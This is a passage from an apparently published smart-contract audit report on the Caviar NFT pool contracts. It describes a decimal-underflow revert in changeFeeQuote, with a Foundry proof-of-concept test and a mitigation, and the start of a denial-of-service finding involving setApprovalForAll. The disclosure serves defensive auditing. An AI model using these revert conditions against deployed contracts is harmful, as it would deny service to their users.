href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">731</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">changeFeeQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">732</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// multiply the changeFee to get the fee per NFT (4 decimals of accuracy)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">733</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() - </span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">734</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">735</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">736</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">737</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">).</span><span class=\"mtk11\">protocolFeeRate</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">738</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>As we can see in the previous snippet, in case the <code>baseToken</code> is an ERC20, then the exponent is calculated as <code>ERC20(baseToken).decimals() - 4</code>. The main issue here is that if the token decimals are less than 4, then the subtraction will cause an underflow due to Solidity’s default checked math, causing the whole transaction to be reverted.</p>\n<p>Such tokens with low decimals exist, one major example is <a href=\"https://etherscan.io/token/0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd\">GUSD</a>, Gemini dollar, which has only two decimals. If any of these tokens is used as the base token of a pool, then any call to the <code>change</code> will be reverted, as the scaling of the charge fee will result in an underflow.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the following test we recreate the “Gemini dollar” token (GUSD) which has 2 decimals and create a Private Pool using it as the base token. Any call to <code>change</code> or <code>changeFeeQuote</code> will be reverted due to an underflow error.</p>\n<p>Note: the snippet shows only the relevant code for the test. Full test file can be found <a href=\"https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f\">here</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_PrivatePool_changeFeeQuote_LowDecimalToken</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Create a pool with GUSD which has 2 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gusd</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">GUSD</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">PrivatePool</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyRegistry</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stolenNftOracle</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gusd</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// address _baseToken,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// address _nft,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">100e18</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint128 _virtualBaseTokenReserves,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">10e18</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint128 _virtualNftReserves,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">500</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint56 _changeFee,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint16 _feeRate,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// bytes32 _merkleRoot,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// bool _useStolenNftOracle,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// bool _payRoyalties</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The following will fail due an overflow. Calls to `change` function will always revert.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">changeFeeQuote</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The implementation of <code>changeFeeQuote</code> should check if the token decimals are less than 4 and handle this case by dividing by the exponent difference to correctly scale it (i.e. <code>chargeFee / (10 ** (4 - decimals))</code>). For example, in the case of GUSD with 2 decimals, a <code>chargeFee</code> value of <code>5000</code> should be treated as <code>0.50</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/858\">outdoteth (Caviar) acknowledged</a></strong> </p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/858#issuecomment-1527400597\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I have considered downgrading as I don’t believe most tokens meet this requirement.</p>\n<p>That said, I believe the finding is valid per our rules, with some tokens, taking the <code>changeFeeQuote</code> will revert due to an assumption that <code>decimals - 4</code> wouldn’t revert.</p>\n<p>The contracts cannot be used for those tokens, but since this is contingent on using such a low decimal token, I agree with Medium Severity and believe a nofix to be fine since most Stablecoins have more than 4 decimals.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-ethroutersell-ethrouterdeposit-and-ethrouterchange-functions-can-be-dosed-for-some-erc721-tokens\" style=\"position:relative;\"><a href=\"#m-05-ethroutersell-ethrouterdeposit-and-ethrouterchange-functions-can-be-dosed-for-some-erc721-tokens\" aria-label=\"m 05 ethroutersell ethrouterdeposit and ethrouterchange functions can be dosed for some erc721 tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/776\">[M-05] <code>EthRouter.sell</code>, <code>EthRouter.deposit</code>, and <code>EthRouter.change</code> functions can be DOS’ed for some ERC721 tokens</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/776\">rbserver</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293</a></p>\n<p><a href=\"https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672\">https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672</a></p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The following <code>EthRouter.sell</code>, <code>EthRouter.deposit</code>, and <code>EthRouter.change</code> functions call the corresponding ERC721 tokens’ <code>setApprovalForAll</code> functions.</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sell</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Sell</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOutputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// loop through and execute the sells</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// approve the pair to transfer NFTs from the router</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minPrice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxPrice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deadline</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// approve pair to transfer NFTs from router</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">change</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Change</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// loop through and execute the changes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Change</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_change</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// approve pair to transfer NFTs from router</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>For ERC721 tokens like Axie, which its <code>setApprovalForAll</code> function is shown below, calling their <code>setApprovalForAll</code> functions with the same <code>msg.sender</code>-<code>_operator</code>-<code>_approved</code> combination would revert because of requirements like <code>require(_tokenOperator[msg.sender][_operator] != _approved)</code>.</p>\n<p>For these ERC721 tokens, calling the <code>EthRouter.sell</code>, <code>EthRouter.deposit</code>, and <code>EthRouter.change</code> functions for the first time, which call such tokens’ <code>setApprovalForAll</code> functions for the first time, can succeed; however, calling the <code>EthRouter.sell</code>, <code>EthRouter.deposit</code>, and <code>EthRouter.change</code> functions again, which call such tokens’ <code>setApprovalForAll</code> functions with the same pool as <code>_operator</code> and <code>true</code> as <code>_approved</code> again, will revert. In this case, the <code>EthRouter.sell</code>, <code>EthRouter.deposit</code>, and <code>EthRouter.change</code> functions are DOS’ed for such ERC721 tokens.</p>\n<p><a href=\"https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672\">https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_operator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_approved</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">whenNotPaused</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenOperator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_operator</span><span class=\"mtk1\">] != </span><span class=\"mtk12\">_approved</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_tokenOperator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_operator</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_approved</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_operator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_approved</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  